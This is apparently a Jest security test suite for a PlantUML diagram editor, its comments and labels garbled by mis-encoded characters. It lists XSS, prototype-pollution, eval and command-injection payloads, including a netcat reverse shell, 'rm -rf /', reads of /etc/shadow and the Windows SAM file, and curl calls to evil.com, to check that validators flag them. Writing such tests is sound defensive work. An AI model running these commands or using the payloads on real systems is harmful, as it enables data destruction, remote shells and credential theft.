/**
 * »­åêÆ£Æ¹È¹¤üÈ - SEC-006 ¤ó¸§¯·çóþV7
 * 
 * þa·¹Æà: PlantUML¨Ç£¿ü
 * Æ¹ÈÄò: ActionEditorConditionEditor»­åêÆ£ßÉë¦§¢
 * 
 * Æ¹Èî:
 * 1. XSS;ƒ2bÆ¹È
 * 2. ³ÞóÉ¤ó¸§¯·çó2bÆ¹È  
 * 3. ×íÈ¿¤×ZÓþVÆ¹È
 * 4. eval()¢púÆ¹È
 * 5. q»­åêÆ£Æ¹È
 * 
 * @author debugger
 * @version 1.0.0
 * @created 2025-08-16
 */

const { JSDOM } = require('jsdom');
const DOMPurify = require('dompurify')(new JSDOM('').window);

// Æ¹Èþaâ¸åüë­¼
const SecurityMiddleware = require('../../src/security/SecurityMiddleware');
const InputValidator = require('../../src/security/InputValidator');
const OutputEscaper = require('../../src/security/OutputEscaper').OutputEscaper;
const CommandInjectionProtector = require('../../src/security/CommandInjectionProtector');
const { InjectionPrevention } = require('../../src/security/InjectionPrevention');

describe('SEC-006 ¤ó¸§¯·çó;ƒþVÆ¹È', () => {
    let securityMiddleware;
    let inputValidator;
    let outputEscaper;
    let commandProtector;
    let injectionPrevention;

    beforeEach(() => {
        // »­åêÆ£³óÝüÍóÈn
        securityMiddleware = new SecurityMiddleware({
            securityLevel: 'maximum',
            strictMode: true,
            enableRealTimeProtection: true
        });
        
        inputValidator = new InputValidator({
            enablePrototypePollutionProtection: true,
            enableEvalDetection: true,
            enableAdvancedXSSDetection: true,
            enableCommandInjectionDetection: true,
            strictMode: true
        });
        
        outputEscaper = new OutputEscaper({
            enableDOMPurifyIntegration: true,
            enableAdvancedHTMLEscape: true,
            enableUnicodeEscape: true,
            strictMode: true
        });
        
        commandProtector = new CommandInjectionProtector({
            strictSandboxMode: true,
            quarantineMode: true
        });
        
        injectionPrevention = new InjectionPrevention();
    });

    describe('XSS;ƒ2bÆ¹È', () => {
        const xssPayloads = [
            // ú,„jXSSÚ¤íüÉ
            '<script>alert("XSS")</script>',
            '<img src="x" onerror="alert(1)">',
            '<svg onload="alert(1)">',
            
            // Ø¦jXSSÚ¤íüÉ
            'javascript:alert(1)',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<object data="javascript:alert(1)"></object>',
            '<embed src="javascript:alert(1)">',
            '<form><button formaction="javascript:alert(1)">',
            
            // DOMÍ\XSS
            'document.write("<script>alert(1)</script>")',
            'element.innerHTML = "<script>alert(1)</script>"',
            'element.outerHTML = "<script>alert(1)</script>"',
            
            // ¤ÙóÈÏóÉéüXSS
            'onload="alert(1)"',
            'onclick="alert(1)"',
            'onmouseover="alert(1)"',
            'onfocus="alert(1)"',
            
            // Çü¿URLXSS
            'data:text/html,<script>alert(1)</script>',
            'data:application/javascript,alert(1)',
            
            // CSS Expression XSS
            'expression(alert(1))',
            'background:url(javascript:alert(1))',
            
            // ¨ó³üÉUŒ_XSS
            '%3Cscript%3Ealert(1)%3C/script%3E',
            '&#60;script&#62;alert(1)&#60;/script&#62;',
            
            // PlantUMLú	nXSS
            'note left: <script>alert(1)</script>',
            'actor "Bob<script>alert(1)</script>"',
            '[[javascript:alert(1) Click here]]'
        ];

        test.each(xssPayloads)('XSSÚ¤íüÉú: %s', async (payload) => {
            // InputValidator Æ¹È
            const validationResult = inputValidator.validate(payload, 'general');
            expect(validationResult.isValid).toBe(false);
            expect(validationResult.errors.some(e => 
                e.type === 'XSS_DETECTED' || e.type === 'DANGEROUS_PATTERN'
            )).toBe(true);

            // OutputEscaper Æ¹È
            const escapeResult = outputEscaper.escape(payload, 'html');
            expect(escapeResult.securityLevel).toMatch(/risky|dangerous/);
            expect(escapeResult.dangerousPatternsFound.length).toBeGreaterThan(0);

            // SecurityMiddleware qÆ¹È
            const securityResult = await securityMiddleware.processSecurely(payload, 'general', 'html');
            expect(securityResult.isSecure).toBe(false);
            expect(securityResult.threatScore).toBeGreaterThan(30);
        });

        test('DOMPurifyqÆ¹È', () => {
            const maliciousHTML = '<script>alert("XSS")</script><p>Safe content</p>';
            
            const result = outputEscaper.escape(maliciousHTML, 'html');
            
            expect(result.domPurifyUsed).toBe(true);
            expect(result.escaped).not.toContain('<script>');
            expect(result.escaped).not.toContain('alert');
            expect(result.securityLevel).toMatch(/secured|risky/);
        });

        test('Ø¦jXSSúÆ¹È', () => {
            const advancedXSSPayloads = [
                'document.getElementById("test")',
                'document.querySelector(".test")',
                'element.appendChild(maliciousNode)',
                'document.createElement("script")'
            ];

            advancedXSSPayloads.forEach(payload => {
                const result = inputValidator.validate(payload, 'general');
                expect(result.advancedXSSDetected).toBe(true);
                expect(result.warnings.some(w => w.type === 'DOM_MANIPULATION')).toBe(true);
            });
        });
    });

    describe('³ÞóÉ¤ó¸§¯·çó2bÆ¹È', () => {
        const commandPayloads = [
            // ú,„j³ÞóÉ¤ó¸§¯·çó
            '; rm -rf /',
            '&& del /f /q C:\\*',
            '| nc -l 4444',
            
            // Windowsú	;ƒ
            'powershell -c "Get-Process"',
            'cmd /c "dir C:\\"',
            'cmd.exe /k "echo hacked"',
            
            // Unix/Linux;ƒ
            'bash -c "curl http://evil.com"',
            'sh -c "wget http://malware.com"',
            '/bin/bash -i',
            
            // ÐÃ¯Æ£Ã¯;ƒ
            '`whoami`',
            '`id`',
            '`cat /etc/passwd`',
            
            // µÖ·§ë;ƒ
            '$(whoami)',
            '$(id)',
            '$(curl http://evil.com)',
            
            // Õ¡¤ëÍ\;ƒ
            '; cat /etc/shadow',
            '&& type C:\\Windows\\System32\\config\\SAM',
            '| tee /tmp/hacked',
            
            // ÍÃÈïü¯;ƒ
            '; nc -e /bin/bash 192.168.1.1 4444',
            '&& telnet 192.168.1.1 23',
            
            // PlantUMLú	n³ÞóÉ¤ó¸§¯·çó
            '!define EVIL `rm -rf /`',
            '!include /etc/passwd',
            '!pragma theme evil'
        ];

        test.each(commandPayloads)('³ÞóÉ¤ó¸§¯·çóú: %s', async (payload) => {
            // InputValidator Æ¹È
            const validationResult = inputValidator.validate(payload, 'general');
            expect(validationResult.commandInjectionDetected).toBe(true);
            expect(validationResult.errors.some(e => e.type === 'COMMAND_INJECTION')).toBe(true);

            // CommandInjectionProtector Æ¹È
            const protectorResult = commandProtector.validateCommand(payload, 'general');
            expect(protectorResult.isSafe).toBe(false);
            expect(protectorResult.detectedPatterns.length).toBeGreaterThan(0);

            // InjectionPrevention Æ¹È
            const preventionResult = injectionPrevention.validateInput(payload, 'general');
            expect(preventionResult.isValid).toBe(false);
            expect(preventionResult.riskLevel).toMatch(/high|critical/);
        });

        test('³ÞóÉŸL¢pú', () => {
            const execFunctions = [
                'eval("malicious code")',
                'Function("return malicious")()',
                'setTimeout("malicious", 100)',
                'setInterval("malicious", 100)',
                'new Function("malicious code")'
            ];

            execFunctions.forEach(func => {
                const result = inputValidator.validate(func, 'general');
                expect(result.evalDetected).toBe(true);
                expect(result.securityLevel).toBe('dangerous');
            });
        });

        test('PlantUMLú	³ÞóÉú', () => {
            const plantUMLCommands = [
                '!include /etc/passwd',
                '!define EVIL system("rm -rf /")',
                '!pragma theme ../../../etc/passwd'
            ];

            plantUMLCommands.forEach(cmd => {
                const result = injectionPrevention.validateInput(cmd, 'plantuml');
                expect(result.isValid).toBe(false);
                expect(result.preventedAttacks.length).toBeGreaterThan(0);
            });
        });
    });

    describe('×íÈ¿¤×ZÓþVÆ¹È', () => {
        const prototypePollutionPayloads = [
            // ú,„j×íÈ¿¤×ZÓ
            '__proto__.polluted = true',
            'constructor.prototype.polluted = true',
            'Object.prototype.polluted = true',
            
            // Öé±ÃÈÕ
            '["__proto__"]["polluted"] = true',
            '["constructor"]["prototype"]["polluted"] = true',
            
            // JSONb
            '{"__proto__": {"polluted": true}}',
            '{"constructor": {"prototype": {"polluted": true}}}',
            
            // ñD×íÈ¿¤×Á§üó
            '__proto__.__proto__.polluted = true',
            'constructor.prototype.constructor.prototype.polluted = true',
            
            // ÝwUŒ_×íÑÆ£
            '__proto__.toString = function(){return "hacked"}',
            'constructor.prototype.valueOf = function(){return "hacked"}',
            'Object.prototype.hasOwnProperty = function(){return true}',
            
            // ¨ó³üÉUŒ_ZÓ
            '["\\u005f\\u005fproto\\u005f\\u005f"]',
            '["\\x5f\\x5fproto\\x5f\\x5f"]'
        ];

        test.each(prototypePollutionPayloads)('×íÈ¿¤×ZÓú: %s', (payload) => {
            // InputValidator Æ¹È
            const result = inputValidator.validate(payload, 'general');
            expect(result.prototypePollutionDetected).toBe(true);
            expect(result.errors.some(e => e.type === 'PROTOTYPE_POLLUTION')).toBe(true);
            expect(result.securityLevel).toBe('dangerous');
        });

        test('ÝwUŒ_×íÑÆ£¢¯»¹ú', () => {
            const protectedProperties = [
                '__proto__',
                'constructor',
                'prototype',
                'valueOf',
                'toString',
                'hasOwnProperty',
                'isPrototypeOf',
                'propertyIsEnumerable'
            ];

            protectedProperties.forEach(prop => {
                const payload = `malicious.${prop}`;
                const result = inputValidator.validate(payload, 'general');
                expect(result.prototypePollutionDetected).toBe(true);
                expect(result.warnings.some(w => w.type === 'PROTECTED_PROPERTY_ACCESS')).toBe(true);
            });
        });

        test('×íÈ¿¤×ZÓµË¿¤º', () => {
            const pollutedInput = '__proto__.polluted = true; constructor.prototype.hacked = true';
            
            const sanitized = inputValidator.sanitizeInput(pollutedInput, 'general');
            
            expect(sanitized).not.toContain('__proto__');
            expect(sanitized).not.toContain('constructor');
            expect(sanitized).not.toContain('prototype');
        });
    });

    describe('eval()¢púÆ¹È', () => {
        const evalPayloads = [
            // ô¥„jeval(
            'eval("malicious code")',
            'eval(userInput)',
            
            // Function constructor
            'Function("return malicious")()',
            'new Function("malicious code")',
            'new Function("return " + userInput)()',
            
            // setTimeout/setInterval with string
            'setTimeout("malicious code", 100)',
            'setInterval("malicious code", 100)',
            'setTimeout("eval(userInput)", 0)',
            
            // “¥„jeval
            'window["eval"]("malicious")',
            'this["eval"]("malicious")',
            'globalThis["eval"]("malicious")',
            
            // constructor access
            '""["constructor"]["constructor"]("malicious")()',
            '[]"["constructor"]["constructor"]("malicious")()'
        ];

        test.each(evalPayloads)('eval(ú: %s', (payload) => {
            const result = inputValidator.validate(payload, 'general');
            expect(result.evalDetected).toBe(true);
            expect(result.errors.some(e => e.type === 'EVAL_DETECTED')).toBe(true);
            expect(result.securityLevel).toBe('dangerous');
        });

        test('eval¢pµË¿¤º', () => {
            const evalInput = 'eval("alert(1)"); Function("return evil")(); setTimeout("hack", 100);';
            
            const sanitized = inputValidator.sanitizeInput(evalInput, 'general');
            
            expect(sanitized).not.toContain('eval(');
            expect(sanitized).not.toContain('Function(');
            expect(sanitized).not.toContain('setTimeout("');
        });
    });

    describe('q»­åêÆ£Æ¹È', () => {
        test(';ƒÑ¿üó', async () => {
            const complexPayload = `
                <script>eval("__proto__.polluted = true")</script>
                && rm -rf / || wget http://evil.com
                !include /etc/passwd
                javascript:alert(document.cookie)
            `;

            // q»­åêÆ£æ
            const result = await securityMiddleware.processSecurely(complexPayload, 'plantuml', 'html');

            expect(result.isSecure).toBe(false);
            expect(result.threatScore).toBeGreaterThan(80);
            expect(result.securityLevel).toBe('critical');
            expect(result.errors.length).toBeGreaterThan(5);
        });

        test('ActionEditorþaÆ¹È', async () => {
            const actionPayloads = [
                'User -> System: <script>alert("XSS")</script>',
                'Actor sends eval("malicious") to System',
                'User -> System: __proto__.polluted = true'
            ];

            for (const payload of actionPayloads) {
                const result = await securityMiddleware.processSecurely(payload, 'action', 'html');
                expect(result.isSecure).toBe(false);
                expect(result.threatScore).toBeGreaterThan(30);
            }
        });

        test('ConditionEditorþaÆ¹È', async () => {
            const conditionPayloads = [
                'alt user.role == "admin" && eval("malicious")',
                'opt condition contains <script>alert(1)</script>',
                'loop while __proto__.polluted'
            ];

            for (const payload of conditionPayloads) {
                const result = await securityMiddleware.processSecurely(payload, 'plantuml', 'html');
                expect(result.isSecure).toBe(false);
                expect(result.threatScore).toBeGreaterThan(30);
            }
        });

        test('ê¢ë¿¤àú', () => {
            const realTimePayloads = [
                '../../../etc/passwd',
                '<script>alert(1)</script>',
                'eval("malicious")',
                '!include /etc/shadow'
            ];

            realTimePayloads.forEach(payload => {
                const threats = injectionPrevention.detectRealTimeThreats(payload);
                expect(threats.hasThreats).toBe(true);
                expect(threats.threatCount).toBeGreaterThan(0);
                expect(threats.highestSeverity).toMatch(/high|critical/);
            });
        });

        test('Ê%µË¿¤º_ý', () => {
            const dangerousInput = `
                <script>eval("__proto__.polluted = true; rm -rf /")</script>
                <iframe src="javascript:alert(1)"></iframe>
                && del /f /q C:\\*
                !include /etc/passwd
            `;

            const sanitized = injectionPrevention.emergencySanitize(dangerousInput);

            expect(sanitized).not.toContain('<script>');
            expect(sanitized).not.toContain('<iframe>');
            expect(sanitized).not.toContain('eval(');
            expect(sanitized).not.toContain('!include');
            expect(sanitized).not.toContain('rm -rf');
        });

        test('»­åêÆ£ìÝüÈ', () => {
            const maliciousInput = '<script>eval("__proto__.polluted = true")</script>';
            const validationResult = inputValidator.validate(maliciousInput, 'general');
            
            const securityReport = inputValidator.generateSecurityReport(maliciousInput, validationResult);

            expect(securityReport).toHaveProperty('timestamp');
            expect(securityReport).toHaveProperty('securityLevel');
            expect(securityReport).toHaveProperty('evalDetected', true);
            expect(securityReport).toHaveProperty('prototypePollutionDetected', true);
            expect(securityReport).toHaveProperty('advancedXSSDetected');
            expect(securityReport.recommendations).toBeDefined();
            expect(securityReport.recommendations.length).toBeGreaterThan(0);
        });

        test('ÑÕ©üÞó¹Æ¹È', async () => {
            const testInput = 'safe input without any malicious content';
            const iterations = 1000;
            
            const startTime = performance.now();
            
            for (let i = 0; i < iterations; i++) {
                await securityMiddleware.processSecurely(testInput, 'general', 'html');
            }
            
            const endTime = performance.now();
            const averageTime = (endTime - startTime) / iterations;
            
            // sGæB“L10msågB‹Sh’º
            expect(averageTime).toBeLessThan(10);
        });

        test('áâêêü¯<', async () => {
            const initialMemory = process.memoryUsage().heapUsed;
            
            // 'Ïnæ’ŸL
            for (let i = 0; i < 1000; i++) {
                await securityMiddleware.processSecurely('test input', 'general', 'html');
            }
            
            // ¬Ùü¸³ì¯·çóŸL
            if (global.gc) {
                global.gc();
            }
            
            const finalMemory = process.memoryUsage().heapUsed;
            const memoryIncrease = finalMemory - initialMemory;
            
            // áâê— L50MBågB‹Sh’º
            expect(memoryIncrease).toBeLessThan(50 * 1024 * 1024);
        });
    });

    describe('¨Ã¸±ü¹h¹Èì¹Æ¹È', () => {
        test(''MjÚ¤íüÉÆ¹È', async () => {
            const largePayload = '<script>alert("XSS")</script>'.repeat(1000);
            
            const result = await securityMiddleware.processSecurely(largePayload, 'general', 'html');
            
            expect(result.isSecure).toBe(false);
            expect(result.processingTime).toBeLessThan(5000); // 5Òå…
        });

        test('Unicode¨ó³üÇ£ó°;ƒ', () => {
            const unicodePayloads = [
                '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
                '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
                '%3Cscript%3Ealert(1)%3C/script%3E'
            ];

            unicodePayloads.forEach(payload => {
                const result = inputValidator.validate(payload, 'general');
                expect(result.isValid).toBe(false);
            });
        });

        test('Í¹ÈW_;ƒÑ¿üó', () => {
            const nestedPayload = 'eval("eval(\\\"eval(\\\\\\\"__proto__.polluted = true\\\\\\\")\\\")\" )';
            
            const result = inputValidator.validate(nestedPayload, 'general');
            
            expect(result.evalDetected).toBe(true);
            expect(result.prototypePollutionDetected).toBe(true);
            expect(result.securityLevel).toBe('dangerous');
        });

        test('z‡Whnulle›', () => {
            const edgeCases = ['', null, undefined, 0, false];
            
            edgeCases.forEach(input => {
                const result = inputValidator.validate(input, 'general');
                expect(result).toBeDefined();
                expect(result.sanitizedInput).toBeDefined();
            });
        });

        test('^ASCII‡W;ƒ', () => {
            const nonAsciiPayloads = [
                'scriptalert1	/script',
                'script	alert1	/script	',
                '5val("malicious")', // Cyrillic 5
                '__@roto__.polluted = true' // Cyrillic @
            ];

            nonAsciiPayloads.forEach(payload => {
                const result = inputValidator.validate(payload, 'general');
                expect(result.securityLevel).not.toBe('safe');
            });
        });
    });

    afterEach(() => {
        // Æ¹ÈŒn¯êüó¢Ã×
        if (securityMiddleware && typeof securityMiddleware.cleanup === 'function') {
            securityMiddleware.cleanup();
        }
    });
});

describe('»­åêÆ£-šÆ¹È', () => {
    test(' '»­åêÆ£ìÙë-š', () => {
        const maxSecurityMiddleware = new SecurityMiddleware({
            securityLevel: 'maximum',
            strictMode: true,
            quarantineMode: true,
            enableRealTimeProtection: true,
            enableThreatLogging: true,
            maxThreatScore: 0 //  ‚³WD-š
        });

        expect(maxSecurityMiddleware.config.securityLevel).toBe('maximum');
        expect(maxSecurityMiddleware.config.strictMode).toBe(true);
        expect(maxSecurityMiddleware.config.quarantineMode).toBe(true);
    });

    test('»­åêÆ£-šnÕ„ô°', () => {
        const middleware = new SecurityMiddleware({
            securityLevel: 'medium',
            strictMode: false
        });

        middleware.updateConfig({
            securityLevel: 'high',
            strictMode: true
        });

        expect(middleware.config.securityLevel).toBe('high');
        expect(middleware.config.strictMode).toBe(true);
    });
});

// Æ¹ÈŸLBnè‹
console.log(`
=== SEC-006 »­åêÆ£Æ¹ÈŸL‹Ë ===

SnÆ¹È¹¤üÈoånî’<W~Y
 XSS;ƒ2b (DOMPurifyq+€)
 ³ÞóÉ¤ó¸§¯·çó2b 
 ×íÈ¿¤×ZÓþV
 eval()¢púh6P
 ActionEditor/ConditionEditorú	n1'
 ê¢ë¿¤àú
 ÑÕ©üÞó¹háâêêü¯
 ¨Ã¸±ü¹h¹Èì¹Æ¹È

…UŒ‹Pœ
- hªnB‹Ú¤íüÉLikúUŒ‹
- »­åêÆ£UÍL2UŒ‹  
- µË¿¤ºLc8k_ýY‹
- ÑÕ©üÞó¹Lú–$…gB‹

===========================================
`);